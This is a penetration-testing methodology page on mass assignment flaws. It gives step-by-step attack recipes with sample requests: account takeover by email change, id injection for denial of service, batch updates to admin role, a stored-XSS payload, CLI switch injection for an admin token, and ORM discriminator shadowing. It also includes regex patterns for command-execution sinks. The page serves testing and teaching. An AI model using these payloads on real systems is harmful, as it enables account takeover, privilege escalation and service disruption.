# Mass Assignment

## Check List

## Methodology

### Black Box

#### HTTP Method Override (PUT) in User APIs

{% stepper %}
{% step %}
Find API documentation in the target
{% endstep %}

{% step %}
Check the target API documentation to see if there is a path like `api/user` or check the API requests in Burp Suite to see if such a path is visible
{% endstep %}

{% step %}
Make a simple request with a simple GET method and check the request to make sure there are no problems with it
{% endstep %}

{% step %}
Then make the request as POST and if it gives an error, check to see what methods the Allow header in the response refers to
{% endstep %}

{% step %}
If the PUT method is present in the Allow response header, change the method to PUT and make the request
{% endstep %}

{% step %}
If it gives a `400` error, send the content type to `application/json` and an empty body `{}`
{% endstep %}

{% step %}
Then check whether the server response gives an error for missing a parameter
{% endstep %}

{% step %}
Put the parameter mentioned in the server response into the request, send it, and check whether the server response has changed or not
{% endstep %}

{% step %}
Then send different numeric or string values ​​such as 1 or Admin into the parameter and if information is extracted in the server response, the vulnerability has been exploited
{% endstep %}
{% endstepper %}

***

#### [Account Takeover via Unvalidated Profile Email Change](https://swisskyrepo.github.io/PayloadsAllTheThings/Mass%20Assignment/#methodology)

{% stepper %}
{% step %}
logging into the application with a normal user account
{% endstep %}

{% step %}
Once logged in, I accessed the Profile Edit Page, where users can update their personal details such as name, email, and phone number
{% endstep %}

{% step %}
Using Burp Suite, I intercepted the request sent to the server when updating profile data. The original request looked like this

```json
POST /api/pcsx/profile_edit HTTP/2
Host: example.com
Accept: application/json, text/plain,

{
    "op_section": "basic_info",
    "operation": "edit",
    "op_data": {
        "value": {
            "firstname": "Test",
            "lastname": "1",
            "phone": "+2010********",
            "location": "anywhere",
            "email": "user@gmail.com"
        }
    }
}
```
{% endstep %}

{% step %}
Modifying Sensitive Fields: I edited the **email** field to an arbitrary address (`victim@gmail.com`), simulating an attack where an attacker hijacks an account by changing the registered email and change the username to victim

```json
POST /api/pcsx/profile_edit HTTP/2
Host: example.com
ccept: application/json, text/plain, /
{"op_section": "basic_info",
    "operation": "edit",
    "op_data": {
        "value": {
            "firstname": "victim",
            "lastname": "1",
            "phone": "+2010********",
            "location": "anywhere",
            "email": "victim@gmail.com"
        }
    }
}
```
{% endstep %}

{% step %}
Sending the Request & Observing the Response
{% endstep %}

{% step %}
After forwarding the modified request, I received a **200 OK** response, confirming that the changes were applied **without validation**

```json
HTTP/2 200 OK
Content-Type: application/json

{
    "data": {
        "avatar": "",
        "fullname": "Victim 1",
        "firstname": "Victim",
        "lastname": "1",
        "email": "victim@gmail.com",
        "location": "anywhere",
        "phone": "+2010********",
    }
}
```
{% endstep %}

{% step %}
refreshed the profile page and saw that the email change was applied, proving that there were no validation checks in place. At this point, an attacker could request a password reset to the newly assigned email and gain full control of the victim’s account
{% endstep %}
{% endstepper %}

***

#### Parameter Tampering

{% stepper %}
{% step %}
Find any "`Add`", "`Create`", or "`Register`" form that sends `JSON`
{% endstep %}

{% step %}
Check the request in Burp Suite to locate the main nested object (`patient`, `user`, `item`) and confirm id is not present in the request but appears in the response
{% endstep %}

{% step %}
Make a normal POST request with valid data and verify the response creates a new record with an auto-incremented id

```json
POST /api/add
{
  "user": {
    "name": "John",
    "email": "john@example.com"
  }
}
```

and Response&#x20;

```json
{ "id": 100, "user": { "id": 100, "name": "John" } }
```
{% endstep %}

{% step %}
Then inject `"id": 999999` inside the nested object (`"patient": {"id": 999999, ...}`) and send the request

```json
{
  "patient": {
    "id": 999999,
    "firstName": "Test",
    "phone": "123456"
  }
}
```
{% endstep %}

{% step %}
If Vulnerable Response

```json
{ "patientId": 999999, "patient": { "id": 999999 } }
```
{% endstep %}

{% step %}
If the response reflects `"id": 999999` in both patientId and patient.id, mass assignment is confirmed

Then inject a very high unused id like 1000000000 and check if the next normal creation skips to 1000000001

```json
{ "user": { "id": 1000000000, "name": "Skip" } }
```
{% endstep %}

{% step %}
Then inject an extremely large value like `1e99` to trigger a database error and extract the max allowed id (usually `9223372036854775807`)

```json
{ "item": { "id": 1e99, "title": "Test" } }
```

Error Example

```json
{ "error": "Value out of range. Max: 9223372036854775807" }
```
{% endstep %}

{% step %}
Then inject the maximum id value 9223372036854775807 and confirm the record is created

```json
{ "device": { "id": 9223372036854775807, "name": "Last" } }
```
{% endstep %}

{% step %}
Then attempt to create a new record normally and if it fails with DuplicateKeyException, global DoS is achieved
{% endstep %}
{% endstepper %}

***

#### Insecure Batch API Processing

{% stepper %}
{% step %}
Find any batch operation API that accepts multiple actions in one request
{% endstep %}

{% step %}
Check the API documentation or Burp Suite history for endpoints like `/api/*/batch`, `/batch`, `/bulk`, or `/api/v1/users/batch`
{% endstep %}

{% step %}
Make a normal `PATCH` or `POST` request with a single valid update and verify the response shows success

```json
PATCH /api/v1/users/batch
[
  {
    "id": 1001,
    "operation": "update",
    "body": { "email": "test@legit.com" }
  }
]
```
{% endstep %}

{% step %}
Expected Response

```json
[{ "id": 1001, "status": "success" }]
```
{% endstep %}

{% step %}
Then send a batch request updating multiple user IDs with sensitive fields like email, balance, role, or `api_key` Example Payload

```json
[
  {
    "id": 1001,
    "operation": "update",
    "body": { "email": "hacked1@evil.com", "balance": 10000 }
  },
  {
    "id": 1002,
    "operation": "update",
    "body": { "email": "hacked2@evil.com", "role": "admin" }
  }
]
```
{% endstep %}

{% step %}
If Vulnerable Response

```json
[{ "status": "success" }, { "status": "success" }]
```
{% endstep %}

{% step %}
If the response confirms updates on other users' data without authorization, IDOR + Mass Assignment is confirmed
{% endstep %}
{% endstepper %}

***

#### Mass-Assignment Led To Stored-XSS

{% stepper %}
{% step %}
Find any API endpoint that accepts JSON input and updates or creates chat, widget, or message objects
{% endstep %}

{% step %}
Check the API documentation or Burp Suite history for endpoints like `/api/chat`, `/api/widget,` `/api/message`, `/api/update`, or /`api/config`
{% endstep %}

{% step %}
Make a normal POST or PATCH request with valid data and verify the response stores the input

```json
POST /api/v1/cache/{id}/invalidate HTTP/1.1
Host: localhost:8080
Content-Length: 54
Content-Type: application/json
User-Agent: PostmanRuntime/7.26.8
Accept: *
Cache-Control: no-cache
Postman-Token: <random-uuid>
Connection: keep-alive

{
    "test": "test",
    "transactionId": 1,
    "key": "chichi4"
}
```
{% endstep %}

{% step %}
Expected Response

```json
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET,POST
Cache-Control: no-cache
Pragma: no-cache
Content-Type: application/json; charset=UTF-8
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-RateLimit-Limit: 1000
X-RateLimit-Remaining: 999
X-RateLimit-Reset: 1730810744
Content-Length: 297
Date: Wed, 05 Nov 2025 10:07:44 GMT

{
    "transactionId": 1,
    "quintanaCacheInfo": {
        "transactionId": 1,
        "cacheName": "testCache",
        "operation": "INVALIDATE",
        "key": "chichi4",
        "Html": "",
        "status": "SUCCESS",
        "timestamp": 1730810744.123456789,
        "nodeId": "node-01",
        "result": true
    },
    "type": 1000,
    "success": true,
    "message": "Cache invalidated successfully",
    "isSuccess": true,
    "application": "false",
    "timestamp": 1730810744
}
```
{% endstep %}

{% step %}
Then inject HTML-related fields like `html`, markup, `bodyHtml`, or `domKey` with a test payload

```json
POST /api/v1/cache/{id}/invalidate HTTP/1.1
Host: localhost:8080
Content-Length: 54
Content-Type: application/json
User-Agent: PostmanRuntime/7.26.8
Accept: *
Cache-Control: no-cache
Postman-Token: <random-uuid>
Connection: keep-alive

{
    "test": "test",
    "transactionId": 1,
    "key": "chichi4"
    "html": ""><script>alert(1)</script>"
}
```
{% endstep %}

{% step %}
If Vulnerable Response

```json
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET,POST
Cache-Control: no-cache
Pragma: no-cache
Content-Type: application/json; charset=UTF-8
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-RateLimit-Limit: 1000
X-RateLimit-Remaining: 999
X-RateLimit-Reset: 1730810744
Content-Length: 297
Date: Wed, 05 Nov 2025 10:07:44 GMT

{
    "transactionId": 1,
    "quintanaCacheInfo": {
        "transactionId": 1,
        "cacheName": "testCache",
        "operation": "INVALIDATE",
        "key": "chichi4",
        "Html": ""><script>alert(1)</script>",
        "status": "SUCCESS",
        "timestamp": 1730810744.123456789,
        "nodeId": "node-01",
        "result": true
    },
    "type": 1000,
    "success": true,
    "message": "Cache invalidated successfully",
    "isSuccess": true,
    "application": "false",
    "timestamp": 1730810744
}
```
{% endstep %}

{% step %}
If the response stores the HTML without stripping, mass assignment to HTML sink is confirmed
{% endstep %}
{% endstepper %}

***

### White Box

#### Mass-Assignment To Command Injection&#x20;

#### Path Traversal to RCE

{% stepper %}
{% step %}
Map the entire target system or product using the Burp Suite tool
{% endstep %}

{% step %}
Draw the entry points and endpoints in XMind
{% endstep %}

{% step %}
Decompile the application based on the programming language used
{% endstep %}

{% step %}
In the service, find a feature that creates its own custom command-line interface (such as `cmd`)
{% endstep %}

{% step %}
Then identify the switches and commands in this command-line interface that are related to authentication
{% endstep %}

{% step %}
In the code, find the authentication endpoint processing logic (like in the code below). Determine the request type and review the inputs it receives

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpPost("Login")]
public IActionResult Login([FromBody] CheckCredentialReq req) // [1]
{
    CheckCredentialResp checkCredentialResp = new CheckCredentialResp();
    this.ValidateLoginInput(req);

    try
    {
        var stopwatch = new Stopwatch();
        stopwatch.Start();

        checkCredentialResp = new AuthenticationCore().DoLogin(req); // [2]

        stopwatch.Stop();
        base.logger.LogInfo(
            $"Total time taken to execute login: [{stopwatch.Elapsed.TotalSeconds:0.00}] second(s)",
            "Login",
            57
        );
    }
    catch (Exception ex)
    {
        base.logger.LogError(ex.Message + " : " + ex.StackTrace, "Login", 61);
        checkCredentialResp.errList = checkCredentialResp?.errList ?? new List<Error>();

        if (checkCredentialResp.errList.Count == 0)
        {
            checkCredentialResp.errList.Add(new Error
            {
                errorCode = 500,
                errLogMessage = "Internal server error."
            });
        }
    }

    return this.Ok(checkCredentialResp);
}
```
{% endtab %}

{% tab title="Java" %}
```java
@PostMapping("Login")
public ResponseEntity<CheckCredentialResp> login(@RequestBody CheckCredentialReq req) { // [1]

    CheckCredentialResp checkCredentialResp = new CheckCredentialResp();
    this.validateLoginInput(req);

    try {
        long startTime = System.currentTimeMillis();

        checkCredentialResp = new AuthenticationCore().doLogin(req); // [2]

        long endTime = System.currentTimeMillis();
        double elapsedSeconds = (endTime - startTime) / 1000.0;

        logger.info(String.format("Total time taken to execute login: [%.2f] second(s)", elapsedSeconds));
    } catch (Exception ex) {
        logger.error(ex.getMessage() + " : " + Arrays.toString(ex.getStackTrace()));

        if (checkCredentialResp == null || checkCredentialResp.getErrList() == null) {
            checkCredentialResp.setErrList(new ArrayList<>());
        }

        if (checkCredentialResp.getErrList().isEmpty()) {
            checkCredentialResp.getErrList().add(new Error(500, "Internal server error."));
        }
    }

    return ResponseEntity.ok(checkCredentialResp);
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public function login(CheckCredentialReq $req)
{
    $checkCredentialResp = new CheckCredentialResp();
    $this->validateLoginInput($req);

    try {
        $start = microtime(true);

        $checkCredentialResp = (new AuthenticationCore())->doLogin($req); // [2]

        $end = microtime(true);
        $elapsed = $end - $start;
        $this->logger->info(sprintf("Total time taken to execute login: [%.2f] second(s)", $elapsed));
    } catch (Exception $ex) {
        $this->logger->error($ex->getMessage() . " : " . $ex->getTraceAsString());

        if (!isset($checkCredentialResp->errList) || $checkCredentialResp->errList === null) {
            $checkCredentialResp->errList = [];
        }

        if (count($checkCredentialResp->errList) === 0) {
            $checkCredentialResp->errList[] = (object)[
                'errorCode' => 500,
                'errLogMessage' => 'Internal server error.'
            ];
        }
    }

    return $this->ok($checkCredentialResp);
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
router.post('/Login', async (req, res) => { // [1]
    let checkCredentialResp = {};

    try {
        const start = Date.now();

        checkCredentialResp = await new AuthenticationCore().doLogin(req.body); // [2]

        const elapsed = (Date.now() - start) / 1000;
        logger.info(`Total time taken to execute login: [${elapsed.toFixed(2)}] second(s)`);
    } catch (ex) {
        logger.error(`${ex.message} : ${ex.stack}`);

        if (!checkCredentialResp.errList) {
            checkCredentialResp.errList = [];
        }

        if (checkCredentialResp.errList.length === 0) {
            checkCredentialResp.errList.push({
                errorCode: 500,
                errLogMessage: "Internal server error."
            });
        }
    }

    res.json(checkCredentialResp);
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Review the code flow and the used functions to check whether, under certain conditions, user input can be passed to the authentication switch in the command-line interface. (In this example, the authentication switch in the CLI is `QLogin`, which is used in line `[1]` in the code below

{% tabs %}
{% tab title="C#" %}
```csharp
private bool DoRemoteCSLogin(CheckCredentialReq loginRequest, ref CheckCredentialResp loginResponse)
{
    int num = 0;
    string empty = string.Empty;
    bool flag = !loginRequest.usernameFieldSpecified;
    bool result;

    if (flag)
    {
        base.logger.LogError("username is not specified. Invalid remote CS login.", "DoRemoteCSLogin", 2154);
        this.FillLoginResponseWithError(ref loginResponse, num, empty, 1127, "unknown error", "");
        result = false;
    }
    else
    {
        bool flag2 = !this.DecodePass(ref loginRequest, ref loginResponse);
        if (flag2)
        {
            result = false;
        }
        else
        {
            loginRequest.username = this.GetFullUsername(loginRequest);
            string commserverName = loginRequest.commserver.Split('*')[0];

            string text;
            string text2;
            num = new QLogin().DoQlogin(loginRequest.commserver, loginRequest.username, loginRequest.password, out text, out text2, out empty, 5, false); // [1]

            bool flag3 = num == 0;
            if (flag3)
            {
                base.logger.LogTrace("Commcell login succeeded for user " + loginRequest.username + " for Commserver " + loginRequest.commserver, "DoRemoteCSLogin", 2175);

                int value;
                string text3;
                num = new QLogin().GetQSDKUserInfo(commserverName, loginRequest.username, text, out value, out text3, out empty); // [2]

                bool flag4 = num == 0;
                if (flag4)
                {
                    // ...
                }
            }
        }
    }

    return result;
}
```
{% endtab %}

{% tab title="Java" %}
```java
private boolean doRemoteCSLogin(CheckCredentialReq loginRequest, CheckCredentialResp loginResponse) {
    int num = 0;
    String empty = "";
    boolean result;

    boolean flag = !loginRequest.isUsernameFieldSpecified();
    if (flag) {
        logger.error("username is not specified. Invalid remote CS login.");
        fillLoginResponseWithError(loginResponse, num, empty, 1127, "unknown error", "");
        result = false;
    } else {
        boolean flag2 = !decodePass(loginRequest, loginResponse);
        if (flag2) {
            result = false;
        } else {
            loginRequest.setUsername(getFullUsername(loginRequest));
            String commserverName = loginRequest.getCommserver().split("\\*")[0];

            String text;
            String text2;
            num = new QLogin().doQlogin(loginRequest.getCommserver(), loginRequest.getUsername(), loginRequest.getPassword(), out text, out text2, out empty, 5, false); // [1]

            boolean flag3 = num == 0;
            if (flag3) {
                logger.trace("Commcell login succeeded for user " + loginRequest.getUsername() +
                             " for Commserver " + loginRequest.getCommserver());

                int value;
                String text3;
                num = new QLogin().getQSDKUserInfo(commserverName, loginRequest.getUsername(), text, out value, out text3, out empty); // [2]

                boolean flag4 = num == 0;
                if (flag4) {
                    // ...
                }
            }
        }
    }

    return result;
}
```
{% endtab %}

{% tab title="PHP" %}
```php
private function doRemoteCSLogin($loginRequest, &$loginResponse) {
    $num = 0;
    $empty = "";
    $result = false;

    $flag = !$loginRequest->usernameFieldSpecified;
    if ($flag) {
        $this->logger->error("username is not specified. Invalid remote CS login.");
        $this->fillLoginResponseWithError($loginResponse, $num, $empty, 1127, "unknown error", "");
        $result = false;
    } else {
        $flag2 = !$this->decodePass($loginRequest, $loginResponse);
        if ($flag2) {
            $result = false;
        } else {
            $loginRequest->username = $this->getFullUsername($loginRequest);
            $commserverName = explode('*', $loginRequest->commserver)[0];

            $text = null;
            $text2 = null;
            $num = (new QLogin())->doQlogin($loginRequest->commserver, $loginRequest->username, $loginRequest->password, $text, $text2, $empty, 5, false); // [1]

            $flag3 = $num === 0;
            if ($flag3) {
                $this->logger->trace("Commcell login succeeded for user {$loginRequest->username} for Commserver {$loginRequest->commserver}");

                $value = null;
                $text3 = null;
                $num = (new QLogin())->getQSDKUserInfo($commserverName, $loginRequest->username, $text, $value, $text3, $empty); // [2]

                $flag4 = $num === 0;
                if ($flag4) {
                    // ...
                }
            }
        }
    }

    return $result;
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
function doRemoteCSLogin(loginRequest, loginResponse) {
    let num = 0;
    let empty = "";
    let result = false;

    const flag = !loginRequest.usernameFieldSpecified;
    if (flag) {
        logger.error("username is not specified. Invalid remote CS login.");
        fillLoginResponseWithError(loginResponse, num, empty, 1127, "unknown error", "");
        result = false;
    } else {
        const flag2 = !decodePass(loginRequest, loginResponse);
        if (flag2) {
            result = false;
        } else {
            loginRequest.username = getFullUsername(loginRequest);
            const commserverName = loginRequest.commserver.split('*')[0];

            let text, text2;
            num = (new QLogin()).doQlogin(loginRequest.commserver, loginRequest.username, loginRequest.password, (t, t2, e) => { text = t; text2 = t2; empty = e; }, 5, false); // [1]

            const flag3 = num === 0;
            if (flag3) {
                logger.trace(`Commcell login succeeded for user ${loginRequest.username} for Commserver ${loginRequest.commserver}`);

                let value, text3;
                num = (new QLogin()).getQSDKUserInfo(commserverName, loginRequest.username, text, (v, t3, e) => { value = v; text3 = t3; empty = e; }); // [2]

                const flag4 = num === 0;
                if (flag4) {
                    // ...
                }
            }
        }
    }

    return result;
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Enter the function and check whether the inputs and arguments used for `QLogin` are placed directly into command instructions. (In the example below, `commserver`, which is user input, is used as `text` and `text2` in the code above

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regex
(string\.Format\s*\()|(\$\s*".*-\w+\s*\{.*\}")|(Process(StartInfo)?\s*\()|(handleQAPIReq\s*\()|(Split\s*\(\s*['"].\*['"])
```
{% endtab %}

{% tab title="Java" %}
```regex
(String\.format\s*\()|(\$\s*".*-\w+\s*\{.*\}")|(Runtime\.getRuntime\(\)\.exec)|(ProcessBuilder\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regex
(sprintf\s*\()|(`.*\$\w+.*`)|(shell_exec\s*\()|(exec\s*\()|(system\s*\()
```
{% endtab %}

{% tab title="Node.js" %}
```regex
(exec\s*\()|(spawn\s*\()|(child_process)|(template\s*string\s*`.*-\w+\$\{.*\}`)
```


{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection(Linux))**

{% tabs %}
{% tab title="C#" %}
```regex
string\.Format\s*\(|\$\s*".*-\w+\s*\{.*\}"|Process(StartInfo)?\s*\(|handleQAPIReq\s*\(|Split\s*\(\s*['"].\*['"]
```
{% endtab %}

{% tab title="Java" %}
```regex
String\.format\s*\(|\$\s*".*-\w+\s*\{.*\}"|Runtime\.getRuntime\(\)\.exec|ProcessBuilder\s*\(
```
{% endtab %}

{% tab title="PHP" %}
```regex
sprintf\s*\(|`.*\$\w+.*`|shell_exec\s*\(|exec\s*\(|system\s*\(
```
{% endtab %}

{% tab title="Node.js" %}
```regex
exec\s*\(|spawn\s*\(|child_process|`.*-\w+\$\{.*\}`
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
internal int DoQlogin(string commserverName, string userName, string password, out string token, out string qsdkGuid, out string errorString, int samlTokenValidityInMins = 5, bool isCreateSamlTokenRequest = false)
{
    string[] array = commserverName.Split('*', StringSplitOptions.None);
    string text = array[0];
    string text2 = string.IsNullOrEmpty(this.csClientName) ? text : this.csClientName;
    string text3;
    errorString = text3 = string.Empty;
    qsdkGuid = text3;
    token = text3;

    if (array.Length > 1)
    {
        text2 = array[1];
    }

    string commandParameters = string.Empty;

    if (isCreateSamlTokenRequest)
    {
        commandParameters = string.Format("-cs {0} -csn {1} -getsamlToken -gt -u {2} -clp {3} -validformins {4} -featureType {5}",
            text, text2, userName, password, samlTokenValidityInMins, this.SAMLTokenFeatureType); // [1]
    }
    else
    {
        commandParameters = string.Format(" -cs {0} -csn {1} -gt -u {2} -clp {3} ",
            text, text2, userName, password); // [2]
    }

    string pinfoXML = QLogin.GetPInfoXML(0, string.Empty, 0,
        Convert.ToInt32(QLogin.QCOMMANDS.QCOMMAND_LOGIN).ToString(),
        Convert.ToInt32(QLogin.QAPI_OperationSubType.QQAPI_OPERATION_NOSUBCOMMAND).ToString(),
        0U, commandParameters, commserverName, null, false, null); // [3]

    string empty = string.Empty;
    string empty2 = string.Empty;
    int num = new QAPICommandCppSharp().handleQAPIReq(pinfoXML, empty, ref empty2); // [4]

    if (num == 0)
    {
        token = empty2;
        if (!isCreateSamlTokenRequest)
        {
            string xml = CVWebConf.GetDecryptedPassword(token);
            QAllTokenInfo qallTokenInfo = new QAllTokenInfo();
            XMLDecoder.ReadXml(xml, qallTokenInfo);
            qsdkGuid = CVWebConf.decodePass(Convert.ToBase64String(qallTokenInfo.tokenInfo[0].guid));
        }
    }

    return num;
}
```
{% endtab %}

{% tab title="Java" %}
```java
int doQlogin(String commserverName, String userName, String password, Holder<String> token, Holder<String> qsdkGuid, Holder<String> errorString, int samlTokenValidityInMins, boolean isCreateSamlTokenRequest) {
    String[] array = commserverName.split("\\*");
    String text = array[0];
    String text2 = (this.csClientName == null || this.csClientName.isEmpty()) ? text : this.csClientName;
    String text3 = "";
    errorString.value = text3;
    qsdkGuid.value = text3;
    token.value = text3;

    if (array.length > 1) {
        text2 = array[1];
    }

    String commandParameters = "";
    if (isCreateSamlTokenRequest) {
        commandParameters = String.format("-cs %s -csn %s -getsamlToken -gt -u %s -clp %s -validformins %d -featureType %s",
            text, text2, userName, password, samlTokenValidityInMins, this.SAMLTokenFeatureType); // [1]
    } else {
        commandParameters = String.format(" -cs %s -csn %s -gt -u %s -clp %s ", text, text2, userName, password); // [2]
    }

    String pinfoXML = QLogin.getPInfoXML(0, "", 0,
        Integer.toString(QLogin.QCOMMANDS.QCOMMAND_LOGIN.ordinal()),
        Integer.toString(QLogin.QAPI_OperationSubType.QQAPI_OPERATION_NOSUBCOMMAND.ordinal()),
        0, commandParameters, commserverName, null, false, null); // [3]

    String empty = "";
    StringHolder empty2 = new StringHolder("");
    int num = new QAPICommandCppSharp().handleQAPIReq(pinfoXML, empty, empty2); // [4]

    if (num == 0) {
        token.value = empty2.value;
        if (!isCreateSamlTokenRequest) {
            String xml = CVWebConf.getDecryptedPassword(token.value);
            QAllTokenInfo qallTokenInfo = new QAllTokenInfo();
            XMLDecoder.readXml(xml, qallTokenInfo);
            qsdkGuid.value = CVWebConf.decodePass(Base64.getEncoder().encodeToString(qallTokenInfo.tokenInfo[0].guid));
        }
    }

    return num;
}
```
{% endtab %}

{% tab title="PHP" %}
```php
function doQlogin($commserverName, $userName, $password, &$token, &$qsdkGuid, &$errorString, $samlTokenValidityInMins = 5, $isCreateSamlTokenRequest = false) {
    $array = explode('*', $commserverName);
    $text = $array[0];
    $text2 = empty($this->csClientName) ? $text : $this->csClientName;
    $text3 = "";
    $errorString = $text3;
    $qsdkGuid = $text3;
    $token = $text3;

    if (count($array) > 1) {
        $text2 = $array[1];
    }

    if ($isCreateSamlTokenRequest) {
        $commandParameters = sprintf("-cs %s -csn %s -getsamlToken -gt -u %s -clp %s -validformins %d -featureType %s",
            $text, $text2, $userName, $password, $samlTokenValidityInMins, $this->SAMLTokenFeatureType); // [1]
    } else {
        $commandParameters = sprintf(" -cs %s -csn %s -gt -u %s -clp %s ", $text, $text2, $userName, $password); // [2]
    }

    $pinfoXML = QLogin::getPInfoXML(0, "", 0, strval(QLogin::QCOMMANDS['QCOMMAND_LOGIN']), strval(QLogin::QAPI_OperationSubType['QQAPI_OPERATION_NOSUBCOMMAND']), 0, $commandParameters, $commserverName, null, false, null); // [3]

    $empty = "";
    $empty2 = "";
    $num = (new QAPICommandCppSharp())->handleQAPIReq($pinfoXML, $empty, $empty2); // [4]

    if ($num === 0) {
        $token = $empty2;
        if (!$isCreateSamlTokenRequest) {
            $xml = CVWebConf::getDecryptedPassword($token);
            $qallTokenInfo = new QAllTokenInfo();
            XMLDecoder::readXml($xml, $qallTokenInfo);
            $qsdkGuid = CVWebConf::decodePass(base64_encode($qallTokenInfo->tokenInfo[0]->guid));
        }
    }

    return $num;
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
function doQlogin(commserverName, userName, password, callback, samlTokenValidityInMins = 5, isCreateSamlTokenRequest = false) {
    let array = commserverName.split('*');
    let text = array[0];
    let text2 = !this.csClientName ? text : this.csClientName;
    let token = "";
    let qsdkGuid = "";
    let errorString = "";

    if (array.length > 1) {
        text2 = array[1];
    }

    let commandParameters = "";
    if (isCreateSamlTokenRequest) {
        commandParameters = `-cs ${text} -csn ${text2} -getsamlToken -gt -u ${userName} -clp ${password} -validformins ${samlTokenValidityInMins} -featureType ${this.SAMLTokenFeatureType}`; // [1]
    } else {
        commandParameters = ` -cs ${text} -csn ${text2} -gt -u ${userName} -clp ${password} `; // [2]
    }

    let pinfoXML = QLogin.getPInfoXML(0, "", 0, QLogin.QCOMMANDS.QCOMMAND_LOGIN.toString(),
        QLogin.QAPI_OperationSubType.QQAPI_OPERATION_NOSUBCOMMAND.toString(),
        0, commandParameters, commserverName, null, false, null); // [3]

    let empty = "";
    let empty2 = "";
    let num = new QAPICommandCppSharp().handleQAPIReq(pinfoXML, empty, (res) => { empty2 = res; }); // [4]

    if (num === 0) {
        token = empty2;
        if (!isCreateSamlTokenRequest) {
            let xml = CVWebConf.getDecryptedPassword(token);
            let qallTokenInfo = new QAllTokenInfo();
            XMLDecoder.readXml(xml, qallTokenInfo);
            qsdkGuid = CVWebConf.decodePass(Buffer.from(qallTokenInfo.tokenInfo[0].guid).toString('base64'));
        }
    }

    return num;
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
After reaching `QLogin`, which performs authentication commands, review the CLI switches responsible for authentication and check whether there is a switch or feature related to admin access or obtaining a valid admin token (such as `localadmin-`)
{% endstep %}

{% step %}
First, test with a low-privilege or local user to see whether this feature works and grants a high-level role or token. If not, review the CLI processor and check whether it uses `dotnet.exe`, since this processor may run with `SYSTEM-level` privileges
{% endstep %}

{% step %}
Due to improper input validation and sanitization of user-supplied arguments in the CLI, it may be possible to inject the desired switch into a user-controlled parameter (such as the Password field) and send the request
{% endstep %}

{% step %}
If you encounter issues obtaining the admin username or related information, review the database to identify the admin username and then resend the request
{% endstep %}
{% endstepper %}

***

#### Privilege Escalation via Polymorphic Discriminator Shadowing in Single-Table Inheritance (STI) ORMs

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on endpoints interacting with user profiles, billing accounts, or organizational structures that possess distinct "tiers" or "roles" functioning under a unified API (e.g., standard users vs. enterprise admins)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify a Single-Table Inheritance (STI) or Table-Per-Hierarchy (TPH) database architecture. In systems with polymorphic entities (e.g., `AdminUser` and `StandardUser` both inheriting from a base `User` class), ORMs store all records in a single physical database table
{% endstep %}

{% step %}
Investigate the ORM's routing mechanism. To distinguish between subclasses, the ORM relies on a hidden "Discriminator Column" (e.g., `user_type`, `__t`, or `dtype`)
{% endstep %}

{% step %}
Analyze the update/patch controller. The developer assumes the API endpoint explicitly restricts modifications to the properties of the _base_ class or the _currently instantiated_ subclass. They implement Mass Assignment using a generic merge utility (e.g., `$model->update($request->all())` or `Object.assign()`)
{% endstep %}

{% step %}
Discover the fatal boundary oversight: Developers frequently forget to blacklist the ORM's internal discriminator column because it is an abstract metadata field, not a visible UI property
{% endstep %}

{% step %}
Formulate the Discriminator Shadowing payload. Craft a standard Mass Assignment payload, but inject the exact string key that the underlying ORM utilizes for its polymorphic mapping, assigning it the value of a highly privileged subclass
{% endstep %}

{% step %}
Example Payload (Mongoose): `{"firstName": "Attacker", "__t": "SuperAdminUser"}`. Example Payload (Hibernate): `{"dtype": "Admin"}`&#x20;
{% endstep %}

{% step %}
Submit the payload to the standard profile update endpoint
{% endstep %}

{% step %}
The generic merge utility iterates over your JSON, pushing the properties into the active memory model. It overwrites the model's internal discriminator property
{% endstep %}

{% step %}
The ORM translates the memory state into a SQL `UPDATE` statement: `UPDATE users SET first_name = 'Attacker', user_type = 'SuperAdminUser' WHERE id = 123`
{% endstep %}

{% step %}
The vulnerability is successfully incubated. Your current session may not immediately reflect the changes
{% endstep %}

{% step %}
Log out and log back into the application
{% endstep %}

{% step %}
During the login hydration phase, the ORM queries the database, reads your newly injected `SuperAdminUser` discriminator, and instantiates your session utilizing the highly privileged administrative Subclass memory object, granting you access to restricted methods and attributes completely bypassing RBAC checks

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:\.HasDiscriminator\s*<\s*string\s*>\s*\(\s*"|HasDiscriminator\s*\(\s*"|Property\s*\(\s*".*type.*"\s*\).*HasValue|HasValue\s*\(\s*".*"\s*\))
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:@DiscriminatorColumn\s*\(\s*name\s*=\s*"|@Inheritance\s*\(\s*strategy\s*=|@DiscriminatorValue\s*\(\s*"|DiscriminatorColumn)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:\$table->string\s*\(\s*['"]type['"]\s*\)\s*->default\s*\(|\$table->string\s*\(\s*['"]discriminator['"]|morphMap\s*\(|Relation::morphMap)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:new\s+Schema\s*\([\s\S]{0,150}?\{\s*discriminatorKey\s*:\s*['"]|discriminatorKey\s*:\s*['"]|Schema\.discriminator\s*\(|\.discriminator\s*\()
```
{% endtab %}
